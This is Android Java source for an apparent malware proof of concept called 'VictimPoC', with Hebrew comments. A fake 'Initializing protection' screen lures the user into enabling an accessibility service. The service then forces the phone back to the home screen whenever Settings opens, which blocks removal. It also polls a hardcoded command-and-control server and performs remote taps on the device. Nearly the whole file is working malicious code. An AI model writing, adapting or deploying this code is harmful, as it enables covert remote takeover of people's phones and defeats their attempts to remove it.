package com.research.victim;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class VictimApp {

    private static final String TAG = "VictimPoC";
    private static final String C2_URL = "http://192.168.43.77:8000/cmd";  // ← שנה לכתובת שלך

    // ======================================
    //          Activity (מסך "טעינה")
    // ======================================
    public static class FakeLoadingActivity extends Activity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            LinearLayout layout = new LinearLayout(this);
            layout.setOrientation(LinearLayout.VERTICAL);
            layout.setGravity(Gravity.CENTER);
            layout.setPadding(60, 100, 60, 100);

            TextView tv = new TextView(this);
            tv.setText("Initializing protection...");
            tv.setTextSize(20);
            layout.addView(tv);

            Button btn = new Button(this);
            btn.setText("Enable Accessibility Service →");
            btn.setVisibility(View.GONE);
            layout.addView(btn);

            setContentView(layout);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                tv.setText("Please enable the service in Settings → Accessibility");
                btn.setVisibility(View.VISIBLE);
            }, 2800);

            btn.setOnClickListener(v ->
                startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
            );
        }
    }

    // ======================================
    //      Accessibility Service
    // ======================================
    public static class StealthService extends AccessibilityService {

        private long lastPoll = 0;

        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                if (pkg.contains("com.android.settings")) {
                    Log.i(TAG, "Settings detected → performing GLOBAL_ACTION_HOME");
                    performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }

            // polling פשוט וגס - רק ל-POC
            long now = System.currentTimeMillis();
            if (now - lastPoll > 11000) {
                lastPoll = now;
                new Thread(this::checkC2).start();
            }
        }

        private void checkC2() {
            try {
                URL url = new URL(C2_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(6000);

                if (conn.getResponseCode() == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    executeCommand(sb.toString());
                    br.close();
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "C2 fetch failed", e);
            }
        }

        private void executeCommand(String response) {
            try {
                JSONObject json = new JSONObject(response);
                String action = json.optString("action", "");

                if ("tap".equals(action)) {
                    float x = (float) json.optDouble("x", 540f);
                    float y = (float) json.optDouble("y", 960f);
                    performTap(x, y);
                }
            } catch (Exception e) {
                Log.e(TAG, "Invalid command", e);
            }
        }

        private void performTap(float x, float y) {
            Path path = new Path();
            path.moveTo(x, y);

            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 80))
                    .build();

            dispatchGesture(gesture, new GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription gestureDescription) {
                    Log.i(TAG, "Tap dispatched: " + x + "," + y);
                }
                @Override
                public void onCancelled(GestureDescription gestureDescription) {
                    Log.w(TAG, "Gesture cancelled");
                }
            }, null);
        }

        @Override
        public void onInterrupt() {}
    }
}
